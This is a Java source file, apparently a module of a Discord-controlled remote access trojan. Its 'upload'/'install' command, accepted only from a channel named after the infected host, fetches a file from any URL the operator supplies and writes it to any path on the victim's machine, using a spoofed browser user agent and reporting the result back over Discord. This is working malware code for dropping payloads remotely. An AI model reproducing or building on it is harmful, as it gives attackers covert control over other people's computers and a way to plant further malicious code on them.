package me.vasler.command.impl;

import me.vasler.Main;
import me.vasler.command.Command;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

public class UploadCommand
extends Command {
    public UploadCommand() {
        super(new String[]{"upload", "install"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        if (!channel.getName().equalsIgnoreCase(Main.name)) {
            return;
        }
        StringBuilder filepath = new StringBuilder();
        for (int i = 2; i < args.length; ++i) {
            if (i == 2) {
                filepath.append(args[i]);
                continue;
            }
            filepath.append(" ").append(args[i]);
        }
        if (args.length < 3) {
            channel.sendMessage("Invalid usage!").queue();
            return;
        }
        try {
            int currByte;
            URL link = new URL(args[1]);
            File file = new File(filepath.toString());
            HttpURLConnection httpURLConnection = (HttpURLConnection)link.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();
            FileOutputStream fileOut = new FileOutputStream(file);
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }
            channel.sendMessage("File being uploaded to " + file.getAbsolutePath()).queue();
        }
        catch (Exception exception) {
            channel.sendMessage("Failed to upload: " + exception).queue();
        }
    }
}

